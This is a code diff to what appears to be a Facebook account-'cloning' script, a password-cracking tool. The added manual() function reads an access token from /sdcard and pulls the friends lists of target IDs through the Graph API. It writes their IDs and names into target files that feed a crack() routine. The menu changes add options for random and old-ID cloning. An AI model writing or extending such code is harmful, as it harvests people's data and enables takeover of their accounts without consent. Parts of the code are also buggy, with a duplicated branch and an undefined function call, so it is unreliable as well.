@@ -308,7 +308,70 @@ def name2():
 				pool.submit(free,idf,pwv)
 			else:
 				pool.submit(crack,idf,pwv)
-	
+
+def create_file():
+    os.system('clear')
+    print(logo)
+    print('  [1] Create file manual')
+    print('  [2] Create file auto')
+    print('  [B] Back to main menu')
+    print(50*'-')
+    cf = input('  Choose method: ')
+    if cf =='1':
+        manual()
+    elif cf =='2':
+        auto()
+    elif cf =='3':
+        likes()
+    elif cf =='3' or cf =='b' or cf =='B':
+        main()
+    else:
+        print('\n  Choose correct option ...')
+        time.sleep(1)
+        create_file()
+
+def manual():
+    try:
+        token = open('/sdcard/tokenofl.txt', 'r').read()
+    except FileNotFoundError:
+        login()
+    try:
+        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
+        q = json.loads(r)
+        uname = q['name']
+    except (KeyError):
+        login()
+    os.system('clear')
+    print(logo)
+    print('  Name: '+uname)
+    print(50*'-')
+    limit = int(input('  How many ids do you want to add ? '))
+    save_file = input('  Save file as: ')
+    t = 0
+    for u in range(limit):
+        t+=1
+        try:
+            ids = input('  Put id no%s: '%t)
+            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
+            q = json.loads(r)
+            for j in q['data']:
+                uids = j['id']
+                names = j['name']
+                first_name = names.split(' ')[0]
+                try:
+                    last_name = names.split(' ')[1]
+                except:
+                    last_name = 'Khan'
+                with open('/sdcard/'+save_file, 'a') as rd:
+                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
+        except KeyError:
+            print('  No friend for '+ids)
+            pass
+    print(50*'-')
+    print('  Ids saved as: '+save_file)
+    print(50*'-')
+    input(' Press enter to back')
+    sarfraz()	
 # CRACKER
 def crack(idf,pwv):
 	global loop,ok,cp
@@ -430,17 +493,20 @@ class Main:
 		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print(" \033[1;32m[1]\033[0;92m FILE CLONING ")
 		print(" \033[1;32m[2] FILE CREAT(UNDER WORK)")
-		print(" \033[1;32m[3] PAK RENDOM CLONING ")
-		print(" \33[1;32m[4] OLD IDZ ")
+		print(" \033[1;32m[3] PUBLIC ID CLONING(UNDER WORK)")
+		print(" \033[1;32m[4] PAK RENDOM CLONING ")
+		print(" \33[1;32m[5] OLD IDZ ")
 		print("\033[1;32m [E] EXIT \n")
 		ZEE =input(" \033[1;32mSELECT : ")
 		if ZEE in ["1", "01"]:
 			File()
 		if ZEE in ["2", "02"]:
-			Public()
+			create_file()
 		if ZEE in ["3", "03"]:
-			os.system("python2 KHD302")
+			Public()
 		if ZEE in ["4", "04"]:
+			os.system("python2 KHD302")
+		if ZEE in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
